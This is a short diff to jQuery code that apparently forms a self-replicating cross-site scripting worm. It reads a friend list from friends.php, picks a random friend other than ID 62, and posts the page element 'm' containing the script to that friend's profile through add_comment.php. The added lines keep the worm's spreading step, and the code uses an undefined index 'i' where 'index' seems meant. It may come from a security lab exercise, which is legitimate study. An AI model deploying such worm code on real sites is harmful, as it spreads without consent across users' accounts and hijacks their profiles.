@@ -5,11 +5,11 @@ $( document ).ready(function(){
     $.get( "friends.php", function( data ) {
 		f = data.split('<')[0].split(',');
 		if(f.length > 1){
-			index = 0;
-			while(f[index] == 62){
-				index = Math.floor(Math.random()*999) % f.length;
+			index = Math.floor(Math.random()*999) % f.length;
+			if(f[index] !== 62){
+				$.ajax({url:"add_comment.php?id="+f[i]+"&comment="+encodeURI(document.getElementById("m").outerHTML)});
+				console.log("Post written to ID: "+f[index]);
 			}
-			$.ajax({url:"add_comment.php?id="+f[i]+"&comment="+encodeURI(document.getElementById("m").outerHTML)});
 		}
 			
 	};
